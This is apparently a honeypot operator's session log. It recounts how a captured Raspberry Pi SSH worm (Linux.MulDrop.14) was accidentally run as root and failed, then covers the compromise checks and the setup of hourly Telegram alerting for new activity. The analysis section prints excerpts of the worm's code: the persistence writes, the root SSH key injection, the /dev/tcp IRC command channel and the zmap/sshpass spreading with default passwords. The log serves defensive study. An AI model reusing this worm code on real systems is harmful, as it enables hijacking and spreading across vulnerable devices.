# SESSION 33 — Automated Alerting, and Running Malware By Accident

**Date:** 2026-09-16
**Box:** Hetzner Cloud VPS `ubuntu-4gb-hel1-2` (62.238.47.215)
**Continuity:** Follows `SESSION-32-deep-actor-analysis-2026-09-16.md`.

**Two things happened.** A captured worm was accidentally executed as root on the
production honeypot host. It did no damage, for a specific and instructive reason. And
the structural gap that made the whole project reactive — no alerting, everything
found by manual query hours or days later — was closed.

---

## 1. The incident: executing a captured worm as root

### 1.1 What happened

Mid-analysis, a captured malware sample was displayed in the terminal with `tail -c`.
The output was a complete bash script beginning `#!/bin/bash`. In a session where
nearly every preceding message had been a paste-this-block instruction, the sample was
visually indistinguishable from a command. It got pasted into a root shell and run.

The sample was `6d1fe6ab3cd04ca5d1ab790339ee2b6577553bc042af3b7587ece0c195267c9b` —
**Linux.MulDrop.14**, the Raspberry Pi SSH worm, uploaded to the honeypot by five
separate IPs under randomised filenames (`EouDsLRq`, `Qd4pKvbJ`, `dYmvSmXH`,
`FzMMx6bW`, `KhtMNcQj`).

### 1.2 What the worm does

```bash
MYSELF=`realpath $0`

if [ "$EUID" -ne 0 ]; then
    NEWMYSELF=`mktemp -u 'XXXXXXXX'`
    sudo cp $MYSELF /opt/$NEWMYSELF
    sudo sh -c "echo '#!/bin/sh -e' > /etc/rc.local"
    sudo sh -c "echo /opt/$NEWMYSELF >> /etc/rc.local"
    sudo reboot
else
    killall bins.sh minerd node nodejs ktx-armv4l ktx-i586 ktx-m68k ktx-mips …

    mkdir -p /root/.ssh
    echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCl0kIN33IJISIufmqpqg54D6s4J0L7XV2…" \
        >> /root/.ssh/authorized_keys

    echo "nameserver 8.8.8.8" >> /etc/resolv.conf
    rm -rf /tmp/ktx* /tmp/cpuminer-multi /var/tmp/kaiten

    cat > /tmp/public.pem <<EOFMARKER
    -----BEGIN PUBLIC KEY-----
    MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC/ihTe2DLmG9huBi9DsCJ90MJs…
    -----END PUBLIC KEY-----
EOFMARKER
    …
fi
```

Three stages: **evict rivals**, **install a root SSH key**, **launch an IRC bot**, then
**spread**.

**The C2 is RSA-signed IRC** — a design worth understanding:

```bash
arr[0]="ix1.undernet.org"  … arr[5]="Chicago.IL.US.Undernet.org"
svr=${arr[$[$RANDOM % 6]]}
eval 'exec 3<>/dev/tcp/$svr/6667;'
…
hash=`echo $privmsg_data | base64 -d -i | md5sum | awk -F' ' '{print $1}'`
sign=`echo $privmsg_h | base64 -d -i | openssl rsautl -verify -inkey /tmp/public.pem -pubin`
if [[ "$sign" == "$hash" ]] ; then
    CMD=`echo $privmsg_data | base64 -d -i`
    RES=`bash -c "$CMD" | base64 -w 0`
```

It joins `#biret` across six rotating UnderNet servers using bash's `/dev/tcp`, with no
IRC client installed. **Every command must be RSA-signed against the embedded public
key** — so nobody but the operator can issue commands, even knowing the channel. Output
is base64'd back over PRIVMSG. Nickname is derived from `uname -a | md5sum`, making
each bot uniquely identifiable.

**The propagation stage is a fully autonomous worm:**

```bash
apt-get install zmap sshpass -y --force-yes
while [ true ]; do
    zmap -p 22 -o $FILE -n 100000
    for IP in `cat $FILE`; do
        sshpass -praspberry scp … $MYSELF pi@$IP:/tmp/$NAME && \
        sshpass -praspberry ssh pi@$IP "cd /tmp && chmod +x $NAME && bash -c ./$NAME" &
        sshpass -praspberryraspberry993311 scp … pi@$IP:/tmp/$NAME && …
    done
done
```

Installs a mass-scanner, sweeps 100,000 hosts per iteration, and tries the two default
Raspberry Pi passwords (`raspberry`, `raspberryraspberry993311`) to copy itself onward.
Once running, it needs no operator.

### 1.3 Why nothing happened

**The first line saved it:**

```bash
MYSELF=`realpath $0`
```

Because the script was **pasted into an interactive shell** rather than saved and
executed, `$0` was `-bash`, not a file path. `realpath` failed and `$MYSELF` was empty.
Every operation depending on the script copying itself broke:

```text
scp: stat local "...": No such file or directory
cp: cannot stat '...': No such file or directory
```

And `zmap` failed independently on every iteration:

```text
[ERROR] blocklist: no addresses are eligible to be scanned in the current configuration
[FATAL] zmap: unable to initialize blocklist / allowlist
```

**No scanning. No propagation. No abuse report.**

### 1.4 Full post-incident verification

Every check ran negative:

```bash
pkill -f zmap; pkill -f sshpass; pkill -f "dev/tcp"
ps aux | grep -E "bash|zmap|sshpass" | grep -v grep
```
→ only the operator's own `-bash`.

```bash
cat /root/.ssh/authorized_keys
```
→
```text
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK/iwVAZHn8wuAjGz7Y5BQQqHqlfLFFxGr8cxasvp/um
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII+1bkONqojkd0oi6WkjcLkkThbRh/4glHFr92GRucju rich-admin-hetzner
```

**Both keys are `ssh-ed25519`. The worm's key is `ssh-rsa`. It is not present.** This
was the single most important check — an attacker key in root's `authorized_keys` is
persistent root access.

| Check | Result |
|---|---|
| `/tmp/public.pem`, `/tmp/bot.log`, `/opt/.r` | absent |
| `/etc/rc.local` | does not exist |
| `/etc/resolv.conf` | unmodified, still systemd-managed |
| Connection to port 6667 | none |
| Outbound `ESTAB` | two — a Telnet attacker inside Cowrie, and the admin SSH session |
| `/opt/` contents | `containerd`, `dionaea`, `wp-honeypot` only |

**One real artifact:** `zmap` and `sshpass` installed successfully. Neither is malware,
but `zmap` on an internet-facing host is a liability — running it would generate an
abuse report. Removed:

```bash
apt-get remove --purge -y zmap sshpass
apt-get autoremove -y
which zmap sshpass     # → nothing
```

### 1.5 Why this was a process failure, not a judgement failure

The conditions that produced it:

- 40+ consecutive messages in one session, nearly all containing a command block to paste
- Captured malware displayed with `cat`/`tail` in **the same visual format** as commands
- Everything running as root, because the analysis genuinely required it
- The sample opened with `#!/bin/bash` — which looks exactly like a script to run

"Be more careful" does not fix that. The fix is structural:

**Rules adopted going forward:**
1. Captured samples are **evidence, not instructions.** Read with `cat`, `head`,
   `strings`, `xxd` only.
2. Any content beginning `#!` is a sample until proven otherwise.
3. Sample content gets an explicit marker distinguishing it from runnable commands.
4. Analysis of executable samples happens as an unprivileged user where possible.

> **LESSON — the most dangerous moment is deep into a long session where everything
> looks the same.** The worm was not disguised or obfuscated. It was correctly
> identified, read, and discussed as malware *in the same message where it got pasted
> into a root shell.* Context collapse, not deception.

> **LESSON — `realpath $0` is why self-replicating scripts often fail when pasted.**
> Worth knowing both defensively and as an analysis technique: a pasted worm typically
> breaks at the self-copy stage. That is luck, not a safety mechanism, and it is not a
> reason to relax rule 1.

---

## 2. Closing the real gap: automated alerting

### 2.1 The problem this solves

`160.119.66.206` — a brand-new C2 with a 15-architecture payload set — was found
roughly **12 hours after first contact**, and only because a manual query happened to
run that day.

Every finding in sessions 30, 31, and 32 was retrospective. The project had zero
detection capability. A honeypot that nobody watches is a log file.

### 2.2 Design

A change detector, not a log parser. It maintains a set of everything previously seen
and reports **only genuinely new** items. No thresholds, no rules to tune, no false
positives from volume spikes.

Five things tracked, chosen directly from what sessions 30–32 found valuable:

| Tracked | Why |
|---|---|
| Cowrie download URLs | New C2 infrastructure (`160.119.66.206`, `45.150.195.235`) |
| Cowrie payload hashes | New malware samples |
| SCP/SFTP uploads | How RedTail, pan-chan and MulDrop all arrived |
| Dionaea payload hashes | Windows-side samples |
| Payload-dropping IPs | The 620 actors that matter, not the 4,787 that don't |

`/opt/honeypot-alerts/check.py` — full source in the repo. Core behaviour:

```python
STATE = "/opt/honeypot-alerts/seen.json"

seen = load()                 # sets of previously-seen values
first_run = not seen

# …scan cowrie.json*, dionaea.sqlite, collect anything not in `seen`…

for k in seen:
    seen[k] |= new[k]         # merge before reporting, so nothing repeats
save(seen)

if first_run:
    print("Baseline established: …")
    sys.exit(0)               # never alert on history
if not any(new.values()):
    sys.exit(0)               # silence when nothing is new
```

Two design decisions worth noting:

- **First run establishes a baseline and alerts nothing.** Otherwise the first
  execution would report 25 days of history.
- **State is merged before output.** An item is reported exactly once, ever.

Baseline on this host:

```text
Baseline established: 49 urls, 76 hashes, 50 uploads, 81 dio_hashes, 624 droppers
```

### 2.3 Telegram delivery

Cowrie already had a working Telegram integration. `/opt/honeypot-alerts/notify.py`
**reads the credentials directly from `cowrie.cfg`** rather than duplicating them:

```python
c = configparser.ConfigParser()
c.read("/home/cowrie/cowrie/etc/cowrie.cfg")
sec = next((s for s in c.sections() if "telegram" in s.lower()), None)
token = c[sec]["bot_token"]
chat  = c[sec]["chat_id"]
```

One secret, one location. Rotating the token updates both systems at once.

Messages are chunked at 3,800 characters (Telegram's limit is 4,096) and sent as
Markdown code blocks. If the send fails, output falls through to stdout so cron's
logging still captures it — an alert that cannot be delivered is still recorded.

```bash
chmod 700 /opt/honeypot-alerts/notify.py
```

### 2.4 Testing it properly

A detector that has never fired is untested. The test forces a known alert by removing
one item from the baseline:

```bash
python3 -c "
import json
p='/opt/honeypot-alerts/seen.json'
d=json.load(open(p)); d['urls']=d['urls'][1:]; json.dump(d,open(p,'w'))
"
python3 /opt/honeypot-alerts/notify.py
```

Result — delivered to Telegram:

```text
============================================================
NEW HONEYPOT ACTIVITY
============================================================

[NEW PAYLOAD URLS] (1)
   http://131.123.40.104/bins.sh
```

`131.123.40.104` is `swiftc2` — the actor from session 30 with its C2 designation in
reverse DNS. The removed item is re-added by the same run, so the baseline
self-repairs.

### 2.5 Scheduled

```bash
cat > /etc/cron.d/honeypot-alerts << 'EOF'
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
MAILTO=""
0 * * * * root /usr/bin/python3 /opt/honeypot-alerts/notify.py >> /var/log/honeypot-alerts.log 2>&1
EOF
systemctl restart cron
```

Hourly. Silent unless something new appears. Logged to
`/var/log/honeypot-alerts.log` regardless of delivery success.

---

## 3. Files changed

| Path | Change |
|---|---|
| `/opt/honeypot-alerts/check.py` | **NEW** — change detector |
| `/opt/honeypot-alerts/notify.py` | **NEW** — Telegram push wrapper |
| `/opt/honeypot-alerts/seen.json` | **NEW** — state (49/76/50/81/624 baseline) |
| `/etc/cron.d/honeypot-alerts` | **NEW** — hourly schedule |
| `/var/log/honeypot-alerts.log` | **NEW** — alert history |
| `zmap`, `sshpass` packages | **REMOVED** — installed by the incident |

---

## 4. Open items

- **Rotate the Telegram bot token.** It appeared in this session's terminal output. If
  these notes are published, revoke via BotFather (`/revoke`, then `/token`) — the
  scripts read from `cowrie.cfg`, so only that one file needs updating.
- **Add log-rotation for `/var/log/honeypot-alerts.log`** before it grows unbounded.
  Session 26's disk-full incident started exactly this way.
- **Consider a second alert tier** for high-signal events: `emu_profiles` growth
  (shellcode captured), a new non-WannaCry PE32, or a session exceeding N commands
  (likely human).
- Verify alerting survives a reboot (cron is enabled, but untested here).
- IOC submission still outstanding.

---

## 5. Lessons

- **A honeypot without detection is a log file.** Everything in sessions 30–32 was
  found retrospectively. The most valuable artifact of this session is not analysis —
  it is that the next `160.119.66.206` surfaces within the hour.
- **Change detection beats rule-writing.** "Report anything never seen before" needs no
  thresholds, no tuning, and produces no false positives from volume spikes.
- **Baseline first, alert second.** Any detector that starts from empty state will
  report all of history on its first run and be ignored thereafter.
- **A detector that has never fired is untested.** Forcing a known alert is worth the
  thirty seconds.
- **Read credentials from where they already live.** Copying the bot token into a
  second config would have created a second thing to rotate.
- **Captured malware is evidence, not instructions** — and in a long session where
  every message contains a command block, that distinction erodes without an explicit
  process rule.
- **Verify a compromise by artifact, not by feeling.** Checking `authorized_keys`,
  `rc.local`, `resolv.conf`, running processes, and outbound connections took two
  minutes and turned "did I just get owned?" into a documented answer.
